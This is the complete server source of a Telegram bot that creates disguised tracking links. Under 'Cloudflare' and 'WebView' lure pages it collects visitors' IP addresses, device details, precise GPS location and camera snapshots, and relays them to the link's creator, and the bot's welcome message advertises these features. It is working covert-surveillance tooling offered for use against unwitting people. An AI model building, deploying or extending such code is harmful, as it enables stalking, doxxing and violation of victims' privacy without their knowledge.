require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const bot = new TelegramBot(process.env["bot"], { polling: true });

// Middlewares
app.use(cors());
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.set("view engine", "ejs");

// Host URL for generated links
const hostURL = "http://production-europe-west4-drams3a.railway-registry.com/3f29bfc2-8e3e-4a2f-87fa-1e2b731be11b:c5aa4cbd-325b-44a1-866b-00778a37ae5c";
const use1pt = false; // URL shortener toggle

// Routes
app.get("/w/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const time = getTime();

  if (req.params.path) {
    res.render("webview", {
      ip, time,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    res.redirect("https://t.me/aadi_io");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const time = getTime();

  if (req.params.path) {
    res.render("cloudflare", {
      ip, time,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    res.redirect("https://t.me/aadi_io");
  }
});

app.get("/", (req, res) => {
  res.json({ ip: getIP(req) });
});

// Telegram Bot Handlers
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }

  if (msg.text === "/start") {
    bot.sendMessage(chatId, `🎉 Welcome ${msg.chat.first_name}! 

🔗 Use this bot to create tracking links that gather visitor info.

✨ Features:
📍 Location tracking
📱 Device info
📷 Camera snapshots
🌐 IP detection

Type /help for usage or click the button below.
👨‍💻 Admin: @aadi_io`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Create Link", callback_data: "crenew" }]]
      }
    });
  } else if (msg.text === "/create") {
    createNew(chatId);
  } else if (msg.text === "/help") {
    bot.sendMessage(chatId, `Send /create to begin.
Then enter a URL (with http/https).
You'll receive 2 tracking links:

1. Cloudflare Page
2. WebView Page

⚠️ Note: Some sites block iframe embedding.

👨‍💻 Admin: @aadi_io`);
  }
});

bot.on('callback_query', (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on('polling_error', (error) => {
  console.log("Polling error:", error.code);
});

// Receive location info
app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;

  if (lat && lon && uid && acc) {
    const userId = parseInt(uid, 36);
    bot.sendLocation(userId, lat, lon);
    bot.sendMessage(userId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  } else {
    res.send("Invalid data");
  }
});

// Device or browser data
app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const data = decodeURIComponent(req.body.data) || null;

  const ip = getIP(req);

  if (uid && data && data.includes(ip)) {
    bot.sendMessage(parseInt(uid, 36), data.replaceAll("<br>", "\n"), { parse_mode: "HTML" });
    res.send("Done");
  } else {
    res.send("ok");
  }
});

// Camera snapshot
app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;

  if (uid && img) {
    const buffer = Buffer.from(img, 'base64');
    const info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };
    bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    res.send("Done");
  } else {
    res.send("Invalid image data");
  }
});

// ------------------- Utility Functions ------------------- //
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
}

function getTime() {
  return new Date().toJSON().slice(0, 19).replace('T', ':');
}

async function createLink(cid, msg) {
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if ((msg.includes('http') || msg.includes('https')) && !encoded) {
    const url = cid.toString(36) + '/' + btoa(msg);
    const cUrl = `${hostURL}/c/${url}`;
    const wUrl = `${hostURL}/w/${url}`;
    let text = `✅ Your Links\nURL: ${msg}\n\n🌐 CloudFlare Page:\n${cUrl}\n\n🌐 WebView Page:\n${wUrl}`;

    if (use1pt) {
      const [x, y] = await Promise.all([
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json()),
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json())
      ]);
      text = `✅ Your Shortened Links\n\n🌐 CloudFlare:\n${Object.values(x).join("\n")}\n\n🌐 WebView:\n${Object.values(y).join("\n")}`;
    }

    bot.sendMessage(cid, text, {
      reply_markup: {
        inline_keyboard: [[{ text: "Create New Link", callback_data: "crenew" }]]
      }
    });
  } else {
    bot.sendMessage(cid, `⚠️ Please enter a valid URL including http/https.`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, {
    reply_markup: { force_reply: true }
  });
}

// ------------------- Start the Server ------------------- //
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`App Running on Port ${port}`);
});
